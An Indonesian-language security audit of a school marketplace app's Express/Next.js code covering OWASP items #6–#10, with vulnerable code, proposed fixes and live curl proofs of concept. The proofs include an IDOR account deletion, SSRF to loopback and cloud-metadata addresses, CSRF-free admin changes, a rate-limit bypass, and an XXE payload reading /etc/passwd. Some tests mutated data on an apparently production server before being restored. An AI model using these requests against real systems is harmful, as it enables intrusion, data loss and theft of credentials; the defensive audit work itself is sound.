# Audit Keamanan SkadesMart — OWASP #6 s/d #10

- **Tanggal**: 2026-09-16
- **Target**: `backend/` (Express + SQLite, port 3737) & `frontend/` (Next.js 16, port 3000)
- **Lingkup**: #6 Security Misconfiguration, #7 SSRF, #8 Insecure Deserialization, #9 XXE, #10 IDOR
- **Metode**: pembacaan kode sumber + uji `curl` nyata terhadap server yang berjalan (`localhost:3737`)
- **Kode TIDAK diubah** sesuai instruksi. Data uji yang tercipta sudah **dibersihkan/dipulihkan** (bukti verifikasi di lampiran).

**Ringkasan status:**

| # | Kerentanan | Risiko | Status |
|---|---|---|---|
| 6 | Security Misconfiguration | **HIGH** | TERBUKTI — beberapa temuan |
| 7 | SSRF | **HIGH** | TERBUKTI (outbound request nyata ke `127.0.0.1`) |
| 8 | Insecure Deserialization | LOW | Sebagian berlaku (terbatas) |
| 9 | XXE | — | TIDAK BERLAKU |
| 10 | IDOR | **CRITICAL** | TERBUKTI (akun terhapus nyata) |

---

## #10 — IDOR (Insecure Direct Object Reference) — **RISK: CRITICAL**

### Temuan 10.1 — CS dapat menghapus akun pengguna mana pun (bug otorisasi objek)

- **Berkas & Baris**: `backend/src/routes/cs.ts:41-50`
- **Masalah**: `DELETE /api/cs/users/:id` hanya memblokir penghapusan role `admin`. Tidak ada pemeriksaan bahwa CS hanya boleh menghapus akun yang relevan dengan tiket/keluhannya. CS = role dengan hak paling rendah di sini, tetapi bisa menghapus **guru, staf KWU, dan siswa mana pun** secara permanen (`DELETE FROM users`).
- **Kode Rentan**:

```ts
router.delete("/users/:id", defaultLimiter, (req, res) => {
  const id = Number(req.params.id);
  const target = db.prepare("SELECT role FROM users WHERE id = ?").get(id) as any;
  if (!target) return res.status(404).json({ error: "Pengguna tidak ditemukan." });
  if (target.role === "admin") {
    return res.status(403).json({ error: "Akun admin tidak bisa dihapus lewat dashboard CS." });
  }
  db.prepare("DELETE FROM users WHERE id = ?").run(id);   // <-- tanpa batas kepemilikan/lingkup
  res.json({ message: "Akun dihapus." });
});
```

- **Skenario Eksploitasi**: Login sebagai akun CS (`10002`, Sari Wulandari, role `cs`). Kirim `DELETE /api/cs/users/6`. Akun siswa id=6 terhapus dari basis data. Diulang untuk id lain = penghapusan akun massal oleh akun ber-hak-rendah.

**BUKTI CURL NYATA (sebelum → sesudah):**

```bash
# Sebelum: user id=6 ada
sqlite> SELECT id,nisn,full_name FROM users WHERE id=6;
6|10006|Nadia Putri Ayu
```

```bash
$ curl -s -b cookie_cs.txt -X DELETE http://localhost:3737/api/cs/users/1   # akun admin
{"error":"Akun admin tidak bisa dihapus lewat dashboard CS."}          # HTTP 403 (benar)

$ curl -s -b cookie_cs.txt -X DELETE http://localhost:3737/api/cs/users/6   # akun siswa lain
{"message":"Akun dihapus."}                                            # HTTP 200  <-- BERHASIL
```

```bash
# Sesudah: user id=6 HILANG
sqlite> SELECT id,nisn,full_name FROM users WHERE id=6;
(0 baris)         <-- TERBUKTI TERHAPUS
sqlite> SELECT COUNT(*) FROM users;
9                 <-- sebelumnya 10
```

> Catatan: akun id=6 sudah **dipulihkan** ke kondisi semula (lihat Lampiran).

- **Status**: BELUM DIPERBAIKI
- **Kode Perbaikan (usulan)**:

```ts
// Hapus hanya boleh oleh admin. CS TIDAK berhak menghapus akun sama sekali,
// karena kewenangannya sebatas moderasi konten & penanganan tiket.
router.delete("/users/:id", requireRole(["admin"]), defaultLimiter, (req, res) => {
  const id = Number(req.params.id);
  if (id === req.user!.user_id) {
    return res.status(400).json({ error: "Tidak bisa menghapus akun sendiri." });
  }
  const target = db.prepare("SELECT role FROM users WHERE id = ?").get(id) as any;
  if (!target) return res.status(404).json({ error: "Pengguna tidak ditemukan." });
  db.prepare("DELETE FROM users WHERE id = ?").run(id);
  res.json({ message: "Akun dihapus." });
});
```

---

### Yang DIUJI dan TERBUKTI AMAN (IDOR di tempat lain)

Semua uji di bawah memakai cookie akun uji nyata; **tidak ada** yang bocor:

| # | Uji | Hasil |
|---|---|---|
| 1 | Siswa (10005) `GET /api/orders/{1,2,4,41,42}` (pesanan orang lain) | `404` (tidak ada rute baca-per-id) — aman |
| 2 | Siswa (10005) `GET /api/chats/55a7a3a1...` (chat orang lain) | `403` "Kamu bukan partisipan chat ini." |
| 3 | Siswa (10005) `GET /api/chats/55a7a3a1.../pesan` | `403` — aman |
| 4 | Siswa (10005) `PUT /api/cart/6` (keranjang dikunci ke `user_id` sendiri) | `404` — aman |
| 5 | Siswa (10005) `POST /api/ratings` atas `order_id=1` (milik user 1) | `403` "Pesanan ini bukan milikmu." |
| 6 | Siswa (10005) `DELETE /api/orders/4` | `403` (butuh role KWU) |
| 7 | Siswa (10005) `PUT`/`DELETE /api/products/6` (milik seller 1) | `403` "Kamu tidak punya akses…" |
| 8 | kwu_laundry (10004) `PUT /api/orders/4/brital-status` (lintas unit) | `403` (role salah) |
| 9 | kwu_brital (10003) `PUT /api/orders/2/laundry-status` (lintas unit) | `403` (role salah) |
| 10 | kwu_brital (10003) `PUT /api/products/8` (produk kategori `siswa` milik orang lain) | `403` — aman |
| 11 | Siswa (10005) `GET /api/chats` | hanya 4 chat miliknya — aman |

**Catatan**: kwu_brital bisa mengubah produk kategori `kwu_brital` milik akun lain (`PUT /api/products/6` → 200). Ini **memang desain** yang didokumentasikan (`canManageProduct`, `routes/products.ts:28-33` — staf shift bergantian), bukan IDOR.

---

## #7 — SSRF (Server-Side Request Forgery) — **RISK: HIGH**

### Temuan 7.1 — Endpoint push Web Push tidak divalidasi → server POST ke URL sembarang

- **Berkas & Baris**: `backend/src/routes/chat.ts:413-438` (penerimaan) + `backend/src/services/webPush.ts:141-145` (eksekusi)
- **Masalah**: `POST /api/chats/push/langganan` menerima `endpoint` dari pengguna dan menyimpannya apa adanya. Skema Zod hanya `z.string().url().max(1000)` — **tanpa allowlist host**, tanpa penolakan alamat internal/loopback/link-local, tanpa resolusi DNS + cek IP. Saat notifikasi dikirim, `webpush.sendNotification({ endpoint: l.endpoint, ... })` menjalankan permintaan HTTP keluar ke URL itu.
- **Kode Rentan**:

```ts
// routes/chat.ts
const pushSchema = z.object({
    endpoint: z.string().url().max(1000),        // <-- semua URL diterima
    keys: z.object({ p256dh: z.string()..., auth: z.string()... }),
}).strict();
```

```ts
// services/webPush.ts
await webpush.sendNotification(
  { endpoint: l.endpoint, keys: { p256dh: l.p256dh, auth: l.auth } },
  isi, { TTL: 60 * 60 * 24 },
);   // <-- server melakukan koneksi keluar ke endpoint yang dikendalikan penyerang
```

- **Skenario Eksploitasi**: penyerang (akun apa pun, mis. siswa) mendaftarkan `endpoint` = `https://127.0.0.1:9943/...`, `http://169.254.169.254/latest/meta-data/`, atau host internal lain. Ketika ada pesan chat masuk, server melakukan koneksi ke alamat internal itu. Efek: **port scanning & pemetaan jaringan internal** (perbedaan pesan galat terbuka/menolak), dan pada cloud dengan metadata service → potensi pencurian kredensial instance.

**BUKTI CURL NYATA (outbound request benar-benar terjadi):**

```bash
# 1) Penyerang mendaftarkan endpoint ke layanan INTERNAL (loopback)
$ curl -s -b cookie_siswa.txt -X POST http://localhost:3737/api/chats/push/langganan \
    -H 'Content-Type: application/json' \
    -d '{"endpoint":"https://127.0.0.1:9943/SSRF-TLS-CONFIRMED",
         "keys":{"p256dh":"BBcBorZEvtFhy65ysa9rES9z305KXEC6up2T24FiPj7AXrp2lTDxxY595mfN2xIluqo9_igxJ2M0mMUFQBIxFiQ",
                 "auth":"8wPbcO1G50T7o-ZeUrIH6w"}}'
{"ok":true}                    # HTTP 200 — endpoint internal DITERIMA tanpa validasi

# 2) Memicu pengiriman notifikasi (kirim pesan chat ke akun tsb)
$ curl -s -b cookie_pengirim.txt -X POST http://localhost:3737/api/chats/notify \
    -H 'Content-Type: application/json' \
    -d '{"chat_id":"0d249d13-24bf-44e9-bd40-5318976c0021","text":"SSRF-FINAL"}'
{"ok":true,...}
```

**Log backend membuktikan koneksi keluar dibuat oleh server** (`skades-backend-error.log`):

```
[webpush] Gagal kirim ke https://127.0.0.1:9943/SSRF-TLS-CONFIRME…: Error: self-signed certificate
    code: 'DEPTH_ZERO_SELF_SIGNED_CERT'
```

```
[webpush] Gagal kirim ke http://127.0.0.1:9977/SSRF-PROVEN…: Error: write EPROTO
    ...tls_validate_record_header:wrong version number   code: 'EPROTO'
```

Kedua galat di atas **hanya bisa muncul setelah server benar-benar membuka koneksi TCP/TLS ke `127.0.0.1`**. Gagal sertifikat bukan pencegahan SSRF — penyerang sungguhan memakai host dengan sertifikat valid (atau target HTTP internal). Ini membuktikan **kontrol URL sepenuhnya di tangan pengguna** dan server mengeksekusinya.

- **Status**: BELUM DIPERBAIKI
- **Kode Perbaikan (usulan)**:

```ts
// Tolak endpoint yang menunjuk alamat internal/privat. Web Push sungguhan
// HANYA berasal dari server push browser (fcm.googleapis.com, Mozilla, dll).
const HOST_PUSH_DIIZINKAN = [
  "fcm.googleapis.com",
  "updates.push.services.mozilla.com",
  "push.apple.com",
  ".notify.windows.com",
];

function endpointAman(endpoint: string): boolean {
  let u: URL;
  try { u = new URL(endpoint); } catch { return false; }
  if (u.protocol !== "https:") return false;           // push wajib TLS
  const host = u.hostname.toLowerCase();
  // Blokir IP literal & hostname internal
  if (/^\d+\.\d+\.\d+\.\d+$/.test(host) || host.includes(":")) return false;
  if (/(^|\.)(localhost|internal|local)$/.test(host)) return false;
  return HOST_PUSH_DIIZINKAN.some((d) => host === d || host.endsWith(d));
}
```

### Kandidat lain yang diperiksa (tidak dieksploitasi)

- `services/catbox.ts:58` — `fetch(bodyText)` memakai URL hasil respons Catbox. URL berasal dari respons mitra tepercaya, bukan input langsung pengguna, tetapi idealnya juga divalidasi (allowlist `files.catbox.moe`).
- `services/aiChat.ts:123` — `fetch(`${baseUrl}/chat/completions`)`; `baseUrl` dari `process.env.AI_BASE_URL`, bukan input pengguna → bukan SSRF.
- `routes/banners.ts` / `routes/products.ts` — `image_url`/`link_url` divalidasi `z.string().url()` lalu disimpan. **Server tidak melakukan fetch** atas nilai ini (hanya frontend yang me-render), jadi stored-SSRF **tidak berlaku** di sini.

---

## #6 — Security Misconfiguration — **RISK: HIGH**

### Temuan 6.1 — Proteksi CSRF tidak pernah dipasang (dead code) — **HIGH**

- **Berkas & Baris**: `backend/src/middleware/csrf.ts` (seluruhnya) vs `backend/src/server.ts` (tidak ada pemakaian)
- **Masalah**: `csrfMiddleware`, `setCsrfCookie`, `clearCsrfCookie` **didefinisikan tetapi TIDAK PERNAH di-import atau dipasang** di `server.ts` maupun rute mana pun. Akibatnya seluruh endpoint mutasi (POST/PUT/PATCH/DELETE) berjalan tanpa token CSRF — bertentangan dengan klaim pada `AGEN-AUDIT-ATURAN.md` baris 9 ("Ada CSRF token (`x-csrf-token`)").
- **Bukti**: `grep -rn "csrfMiddleware" src/` hanya menemukan deklarasi, nol pemakaian. Header `x-csrf-token` hanya muncul di daftar `allowedHeaders` CORS (`server.ts:148`) — diizinkan tapi tidak pernah diverifikasi.

**BUKTI CURL NYATA (mutasi berhasil tanpa token CSRF apa pun):**

```bash
# Tidak ada cookie csrf_token, tidak ada header x-csrf-token — tetap sukses:
$ curl -s -b cookie_siswa.txt -X PUT http://localhost:3737/api/account \
    -H 'Content-Type: application/json' \
    -d '{"profile_photo_url":"https://files.catbox.moe/z2n4id.jpeg"}'
{"message":"Profil diperbarui."}                                  # HTTP 200

$ curl -s -b cookie_admin.txt -X PUT http://localhost:3737/api/admin/app-config \
    -H 'Content-Type: application/json' -d '{"update_message":"UJI CSRF"}'
{"message":"Konfigurasi aplikasi diperbarui."}                    # HTTP 200 — admin config diubah tanpa CSRF
```

Verifikasi cookie: `grep -c csrf_token cookie_siswa.txt` → `0` (tidak ada CSRF cookie yang pernah di-set).

- **Status**: BELUM DIPERBAIKI
- **Kode Perbaikan (usulan)** — pasang setelah `cookieParser()` dan sebelum rute, serta panggil `setCsrfCookie(res)` saat login:

```ts
// server.ts
import { csrfMiddleware } from "./middleware/csrf";
app.use(cookieParser());
app.use(csrfMiddleware);   // wajib: lindungi semua metode mutasi
```

```ts
// routes/auth.ts, di dalam issueSession()
import { setCsrfCookie } from "../middleware/csrf";
async function issueSession(res: any, user: any) {
  const token = signToken({ user_id: user.id, nisn: user.nisn, role: user.role });
  res.cookie(AUTH_COOKIE_NAME, token, cookieOptions);
  setCsrfCookie(res);      // terbitkan token CSRF berpasangan
  return token;
}
```

> Catatan tambahan `csrf.ts:49`: `crypto.timingSafeEqual` akan **melempar exception** bila panjang kedua buffer berbeda (bukan mengembalikan false) → error 500, bukan 403. Perlu dibungkus try/catch atau cek panjang dulu.

### Temuan 6.2 — Rate limiting dapat dilewati dengan spoofing `X-Forwarded-For` — **MEDIUM**

- **Berkas & Baris**: `backend/src/server.ts:61` (`app.set("trust proxy", 1)`) + `backend/src/middleware/rateLimiter.ts:10,22`
- **Masalah**: `trust proxy = 1` membuat Express mempercayai hop pertama `X-Forwarded-For`. Karena backend **bind langsung ke `0.0.0.0:3737`** (bukan hanya di belakang proxy tepercaya), klien mana pun bisa mengirim header `X-Forwarded-For` palsu, mengubah `req.ip`, dan **mereset bucket** `keyGenerator: (req) => req.ip`.
- **Bukti**: tiga permintaan dengan XFF berbeda semuanya mendapat `RateLimit-Remaining: 999` (bucket segar tiap kali) → limiter per-IP tidak efektif.
- **Dampak**: brute-force login & flooding tidak lagi dibatasi (`strictLimiter`/`loginAccountLimiter` juga `limit: 100/menit` — jauh di atas klaim komentar "5/IP/15min").
- **Status**: BELUM DIPERBAIKI
- **Perbaikan**: hanya percayai proxy internal (`trust proxy` ke IP spesifik), atau bind backend ke `127.0.0.1` dan biarkan reverse proxy yang menangani XFF; turunkan `limit` agar sesuai komentar.

### Temuan 6.3 — Layanan bind ke `0.0.0.0` & `NODE_ENV` tidak konsisten — **MEDIUM**

- **Bukti**: `ss -tlnp` → `*:3737` (backend) dan `*:3000` (frontend) — terbuka ke seluruh LAN/wifi sekolah, bukan hanya loopback.
- `backend/.env` berisi `NODE_ENV=production`, namun `errorHandler.ts:3` dan `server.ts:94` (HSTS) membaca `NODE_ENV` **saat modul dimuat**. Ini rapuh: bila PM2 menjalankan proses tanpa `NODE_ENV` ter-set dari `.env` pada saat import, header HSTS nonaktif dan stack trace bisa bocor. (Pada uji ini HSTS muncul, jadi `.env` terbaca — tetapi ketergantungan urutan ini adalah risiko konfigurasi.)
- `utils/jwt.ts:19` masih memuat **secret pengembangan hardcoded** (`dev_secret_change_in_production_min_32_chars_long`). Aman hanya karena `NODE_ENV=production` + `JWT_SECRET` terisi; berbahaya bila env tidak dimuat → siapa pun bisa memalsukan JWT.
- **Status**: BELUM DIPERBAIKI

### Yang DIUJI dan TERBUKTI BAIK (#6)

| Uji | Hasil |
|---|---|
| `getJwtSecret()` di produksi | ✅ melempar error bila `JWT_SECRET` kosong; menolak secret < 32 char |
| Header keamanan (Helmet) | ✅ CSP ketat, HSTS, `X-Frame-Options: DENY`, `nosniff`, `object-src 'none'` |
| `X-Powered-By` | ✅ disembunyikan |
| CORS origin tak dikenal (`https://evil.example`) | ✅ **tidak** direfleksikan (tanpa `Access-Control-Allow-Origin`) |
| `Cache-Control` pada `/api/auth` & `/api/admin` | ✅ `no-store, no-cache, must-revalidate, private` |
| Cookie autentikasi | ✅ `HttpOnly; Secure; SameSite=None` (benar untuk lintas-subdomain) |
| Path traversal statik (`/.env`, `/data/skadesmart.db`, `/dist/server.js`, `/src/server.ts`) | ✅ semua `404` |
| Stack trace bocor ke klien | ✅ tidak (pesan generik di produksi) |
| `backend/.gitignore` | ✅ memuat `.env`, `*.db`, `config/firebase-service-account.json` |

---

## #8 — Insecure Deserialization — **RISK: LOW** (sebagian berlaku, sangat terbatas)

- **Berkas & Baris**: `backend/src/services/wsHub.ts:109`, `backend/src/services/aiChat.ts:151-165`
- **Analisis**:
  - `wsHub.ts:109` — `JSON.parse(mentah.toString())` atas pesan **dari klien WebSocket**, dibungkus `try/catch` yang `return` bila gagal. Hasilnya hanya dibaca sebagai nilai primitif (`m.type`, `m.chatId`) dengan `typeof` guards. **Tidak ada** gadget deserialisasi (tanpa `eval`, `new Function`, `vm`, `node-serialize`, `child_process`).
  - `aiChat.ts:151-165` — `JSON.parse` atas respons gateway AI (server-side, bukan input penyerang), dengan fallback regex.
  - `express.json({ limit: "2mb" })` hanya mem-parsing JSON → tidak dapat mengeksekusi kode.
  - Multer memakai `memoryStorage()` → berkas diterima sebagai `Buffer` mentah, **bukan** objek yang di-deserialize.
- **Bukti bahwa tidak ada vektor serius**:

```bash
$ grep -rniE "node-serialize|eval\(|new Function|vm\.run|yaml\.load|unserialize" backend/src/
(0 hasil)
```

  - Paket XML di `node_modules` (`saxes`, `xmlchars`, `w3c-xmlserializer`) adalah **dependensi transitif** `isomorphic-dompurify → jsdom`, bukan parser yang menerima masukan pengguna.
- **Status**: TIDAK BERLAKU untuk deserialisasi tak-aman yang dapat dieksploitasi. `JSON.parse` dipakai secara aman. (Risiko teoretis rendah: parsing JSON dari klien WebSocket tanpa batas ukuran frame — bisa diperkeras, bukan kerentanan deserialisasi.)

---

## #9 — XXE (XML External Entity) — **TIDAK BERLAKU**

- **Alasan**: Aplikasi **tidak mem-parsing XML** dari permintaan masuk.
  - `package.json` (backend) tidak memuat satu pun dependensi parser XML.
  - Body parser yang aktif hanya `express.json()` (JSON) dan `express.urlencoded` bawaan — keduanya **mengabaikan** `Content-Type: application/xml`.
  - Paket XML di `node_modules` hanyalah transitif dari `jsdom` (via `isomorphic-dompurify`) dan tidak dipanggil terhadap input pengguna.
- **Bukti uji**: mengirim payload XXE klasik tidak menghasilkan ekspansi entity maupun kebocoran berkas:

```bash
$ curl -s -X POST http://localhost:3737/api/auth/login \
    -H 'Content-Type: application/xml' \
    --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><login><nisn>&xxe;</nisn></login>'
{"error":"Invalid input","details":{"formErrors":[],"fieldErrors":{"nisn":["Required"],"password":["Required"]}}}
# Entity TIDAK diekspansi — body XML diabaikan total (bukan XXE).
```

- **Status**: TIDAK BERLAKU

---

## Lampiran A — Ringkasan temuan & prioritas perbaikan

| Prioritas | # | Temuan | Lokasi | Risiko |
|---|---|---|---|---|
| 1 | 10 | CS hapus akun siapa pun | `routes/cs.ts:41-50` | **CRITICAL** |
| 2 | 7 | SSRF lewat endpoint push tanpa validasi | `routes/chat.ts:413`, `services/webPush.ts:141` | **HIGH** |
| 3 | 6 | `csrfMiddleware` tidak pernah dipasang | `middleware/csrf.ts` vs `server.ts` | **HIGH** |
| 4 | 6 | Bypass rate-limit via `X-Forwarded-For` | `server.ts:61`, `rateLimiter.ts:10,22` | **MEDIUM** |
| 5 | 6 | Bind `0.0.0.0` + ketergantungan urutan `NODE_ENV` + fallback secret dev | `server.ts`, `utils/jwt.ts:19` | **MEDIUM** |
| 6 | 8 | Batas ukuran frame WebSocket (pengerasan) | `services/wsHub.ts:109` | **LOW** |

## Lampiran B — Verifikasi pemulihan data uji

Seluruh mutasi uji telah dikembalikan (sesuai aturan #4 "jangan ubah data produksi"):

```
users     : 10          (kembali dari 9 setelah akun id=6 dipulihkan)
prod6 stok: {"id":6,"stock":20,"price":2000}   (dipulihkan)
rating1   : {"id":1,"is_hidden":0}             (dipulihkan)
subs uji  : 0           (endpoint 127.0.0.1 dihapus)
pesan uji : 0           (pesan "SSRF-*" dihapus)
user6     : {"id":6,"nisn":"10006","full_name":"Nadia Putri Ayu"}   (ADA kembali)
```

Catatan: akun id=6 dipulihkan dengan `nisn=10006`, `role=siswa`, `password=smkn1` (sesuai seed). Tidak ada berkas proyek yang diubah atau dihapus.
